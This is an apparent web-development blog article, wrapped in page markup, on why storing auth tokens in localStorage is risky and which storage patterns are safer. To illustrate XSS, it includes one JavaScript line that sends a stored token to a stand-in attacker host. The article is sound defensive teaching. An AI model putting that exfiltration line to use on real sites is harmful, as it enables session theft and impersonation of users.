@@ -1,0 +1,166 @@
+<!DOCTYPE html>
+<html lang="en" data-theme="light">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Security Risks of Storing Tokens in Local Storage - web-development</title>
+    <meta name="description" content="Storing sensitive authentication tokens, such as JSON Web Tokens (JWTs) or API keys, in browser local storage is a common convenience in modern web development, but it introduces significant security vulnerabilities. Because local storage lacks essential">
+    <link rel="canonical" href="https://salivity.github.io/web-development/article/security-risks-of-storing-tokens-in-local-storage">
+    <link rel="search" type="application/opensearchdescription+xml" title="web-development" href="/web-development/opensearch.xml">
+    <link rel="icon" href="/web-development/favicon.ico">
+    <link rel="stylesheet" href="/web-development/css/style.css">
+    <link media="print" rel="stylesheet" href="/web-development/css/print.css">
+    <script src="/web-development/js/fuse.min.js"></script>
+    <script src="/web-development/js/script.js"></script>
+    <script id="MathJax-script" src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/4.1.3/tex-chtml.min.js" defer></script>
+    <script src="/monetize/monetize.js"></script>
+    <script src="/social/social.js"></script>
+    <meta property="og:type" content="website" />
+    <meta property="og:title" content="Security Risks of Storing Tokens in Local Storage - web-development" />
+    <meta property="og:url" content="https://salivity.github.io/web-development/article/security-risks-of-storing-tokens-in-local-storage" />
+    <meta property="og:image:url" content="https://salivity.github.io/web-development/images/open-graph/default.webp" />
+    <meta property="og:image:secure_url" content="https://salivity.github.io/web-development/images/open-graph/default.webp" />
+    <meta property="og:image:width" content="1120" />
+    <meta property="og:image:height" content="630" />
+    <meta property="og:description" content="Storing sensitive authentication tokens, such as JSON Web Tokens (JWTs) or API keys, in browser local storage is a common convenience in modern web development, but it introduces significant security vulnerabilities. Because local storage lacks essential" />
+    <link rel="manifest" href="/web-development/pwa/manifest.json" />
+</head>
+<body>
+    <header>
+        <a href="/web-development/" aria-label="Go To Home Page" title="Go To Home Page" id="logo">
+            <span>salivity.github.io/</span><span>web-development</span>
+        </a>
+        <nav>
+            <ul class="header-links">
+                <li><a href="/web-development/search" title="Search" aria-label="Go To Search Page"><svg class="svg-icon" aria-hidden="true" focusable="false" viewBox="0 0 24 24"><path d="M15.5 14h-.79l-.28-.27C15.41 12.59 16 11.11 16 9.5 16 5.91 13.09 3 9.5 3S3 5.91 3 9.5 5.91 16 9.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14"></path></svg></a></li>
+                <li><a id="theme-toggle" title="Theme" href="javascript:void(0);" aria-label="Toggle Website Theme"></a></li>
+            </ul>
+        </nav>
+    </header>
+    <main>
+        <article><h1 id="security-risks-of-storing-tokens-in-local-storage">Security
+Risks of Storing Tokens in Local Storage</h1>
+<p>Storing sensitive authentication tokens, such as JSON Web Tokens
+(JWTs) or API keys, in browser local storage is a common convenience in
+modern web development, but it introduces significant security
+vulnerabilities. Because local storage lacks essential browser-enforced
+security mechanisms, it primarily exposes sensitive credentials to
+Cross-Site Scripting (XSS) attacks, indefinitely exposes tokens across
+sessions, and grants excessive access to third-party scripts. This
+article outlines the specific security risks associated with keeping
+tokens in web storage and covers the safer storage patterns recommended
+by security standards.</p>
+<h3 id="complete-exposure-to-cross-site-scripting-xss">Complete Exposure
+to Cross-Site Scripting (XSS)</h3>
+<p>The most critical danger of storing sensitive tokens in
+<code>localStorage</code> is its total vulnerability to XSS attacks. By
+design, any JavaScript running within the context of your application's
+domain has unrestricted read and write access to the
+<code>localStorage</code> object via the global
+<code>window.localStorage</code> API.</p>
+<p>If an attacker identifies an XSS vulnerability—whether through an
+unsanitized input field, a malicious third-party script, an outdated npm
+dependency, or a compromised CDN—they can extract stored tokens with a
+single line of code:</p>
+<div class="sourceCode" id="cb1"><pre
+class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true" tabindex="-1"></a><span class="fu">fetch</span>(<span class="st">&#39;https://attacker.example.com/steal?token=&#39;</span> <span class="op">+</span> localStorage<span class="op">.</span><span class="fu">getItem</span>(<span class="st">&#39;authToken&#39;</span>))<span class="op">;</span></span></code></pre></div>
+<p>Once exfiltrated, the attacker can use this token to impersonate the
+legitimate user, access protected backend resources, and perform
+unauthorized actions until the token expires or is manually revoked.</p>
+<h3 id="absence-of-protective-security-flags">Absence of Protective
+Security Flags</h3>
+<p>Unlike browser cookies, Web Storage (which includes both
+<code>localStorage</code> and <code>sessionStorage</code>) provides no
+built-in security attributes to restrict how data is accessed or
+transmitted:</p>
+<ul>
+<li><strong>No <code>HttpOnly</code> Equivalent:</strong> The
+<code>HttpOnly</code> flag for cookies prevents client-side scripts from
+reading the cookie data. Local storage has no such flag; its contents
+are permanently accessible to JavaScript.</li>
+<li><strong>No <code>Secure</code> Flag Equivalent:</strong> The
+<code>Secure</code> flag on cookies ensures that credentials are
+transmitted exclusively over encrypted HTTPS connections. Local storage
+data is tied strictly to the domain origin, meaning it can be
+manipulated or read by client-side code regardless of network-level
+restrictions.</li>
+<li><strong>No <code>SameSite</code> Scoping:</strong> Cookies can
+utilize <code>SameSite=Strict</code> or <code>SameSite=Lax</code> to
+govern cross-site request behavior. Local storage is domain-bound, but
+once an XSS flaw exists anywhere on that domain, boundary enforcement
+disappears.</li>
+</ul>
+<h3 id="extended-attack-window-due-to-persistence">Extended Attack
+Window Due to Persistence</h3>
+<p>Data stored in <code>localStorage</code> does not expire
+automatically. Unlike session cookies or
+<code>sessionStorage</code>—which are wiped when the browser or tab
+closes—<code>localStorage</code> data persists indefinitely until
+cleared manually by the user or programmatically via code.</p>
+<p>If an access token with a long time-to-live (TTL) is stored in
+<code>localStorage</code>, an attacker can compromise a machine days or
+weeks later and extract valid credentials. This persistence also
+increases risks on shared or public computers, where subsequent users
+might regain access to an authenticated session if the previous user
+forgot to log out.</p>
+<h3 id="supply-chain-and-third-party-script-risks">Supply Chain and
+Third-Party Script Risks</h3>
+<p>Modern web applications routinely load external libraries, tracking
+scripts, analytics, and advertising pixels. If any external script
+loaded onto the page is compromised or malicious, it executes within
+your application's origin context. Consequently, that third-party code
+has identical access to <code>localStorage</code> as your proprietary
+code, drastically expanding your attack surface to the entire dependency
+tree.</p>
+<h3 id="recommended-alternatives">Recommended Alternatives</h3>
+<p>To properly safeguard sensitive tokens and session credentials, web
+developers should use more secure storage patterns:</p>
+<ul>
+<li><strong>HttpOnly, Secure, SameSite Cookies:</strong> Store session
+identifiers and refresh tokens in HTTP cookies marked with
+<code>HttpOnly</code>, <code>Secure</code>, and
+<code>SameSite=Strict</code> (or <code>Lax</code>). This completely
+blocks client-side JavaScript access, neutralizing the threat of token
+theft via XSS. Note that while this mitigates token theft, backend APIs
+must implement standard Cross-Site Request Forgery (CSRF)
+protections.</li>
+<li><strong>In-Memory Storage:</strong> Keep short-lived access tokens
+strictly in application memory (such as a local JavaScript variable,
+closure, or state store). Because the token is never written to disk or
+the browser storage engine, it cannot be recovered after the page
+reloads. A secure, <code>HttpOnly</code> cookie-based refresh token can
+then silently request new in-memory access tokens as needed.</li>
+</ul></article>
+        <div id="comments-container"></div>
+
+        <script>
+            const utterancesScript = document.createElement('script');
+            
+            utterancesScript.setAttribute('src', 'https://utteranc.es/client.js');
+            utterancesScript.setAttribute('repo', 'salivity/web-development'); 
+            utterancesScript.setAttribute('issue-term', 'pathname'); 
+            utterancesScript.setAttribute('theme', localStorage.getItem('theme') === 'dark' ? 'github-dark' : 'github-light'); 
+            utterancesScript.setAttribute('crossorigin', 'anonymous');
+            utterancesScript.async = true;
+
+            document.getElementById('comments-container').appendChild(utterancesScript);
+        </script>
+    
+    </main>
+    <footer>
+        <nav>
+            <ul class="social-links">
+            </ul>
+        </nav>
+        <nav>
+            <ul class="footer-links">
+                <li><a href="/web-development/privacy-policy">Privacy Policy</a></li>
+                <li><a href="/web-development/terms-and-conditions">Terms and Conditions</a></li>
+            </ul>
+        </nav>
+        <div class="copyright">
+            Copyright &copy; <span id="current-year"></span>
+        </div>
+    </footer>
+</body>
+</html>
